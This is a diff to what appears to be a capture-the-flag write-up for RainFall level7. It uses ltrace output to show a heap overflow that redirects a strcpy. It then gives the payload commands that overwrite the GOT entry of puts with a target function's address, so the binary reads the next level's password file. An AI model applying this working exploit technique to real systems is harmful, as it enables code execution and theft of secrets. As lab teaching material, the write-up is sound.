@@ -19,6 +19,36 @@ $1 = {<text variable, no debug info>} 0x80484f4 <m>
 
 can't pass argv[2] to gdb, most annoying to get the offset, I assumed 16 but it actually overrides the address of  `b[1]` in the third malloc at a padding of 20
 
+By running `ltrace` we see that we can change the destination address of the second strcpy call:
+```shell
+level7@RainFall:~$ ltrace ./level7 "ARGV1" "ARGV2"
+__libc_start_main(0x8048521, 3, 0xbffff6e4, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                = 0x0804a008
+malloc(8)                                                = 0x0804a018
+malloc(8)                                                = 0x0804a028
+malloc(8)                                                = 0x0804a038
+strcpy(0x0804a018, "ARGV1")                              = 0x0804a018
+strcpy(0x0804a038, "ARGV2")                              = 0x0804a038
+fopen("/home/user/level8/.pass", "r")                    = 0
+fgets( <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+level7@RainFall:~$ ltrace ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') "ARGV2"
+__libc_start_main(0x8048521, 3, 0xbffff6d4, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                = 0x0804a008
+malloc(8)                                                = 0x0804a018
+malloc(8)                                                = 0x0804a028
+malloc(8)                                                = 0x0804a038
+strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAA(\231\004\b")    = 0x0804a018
+strcpy(0x08049928, "ARGV2")                              = 0x08049928
+fopen("/home/user/level8/.pass", "r")                    = 0
+fgets( <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
+
+So we can use it to overwrite the Global Offset Table value of `puts` with the address of `m`.
 ```shell
 level7@RainFall:~$ ./level7 $(python -c 'print "a"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')                        
 
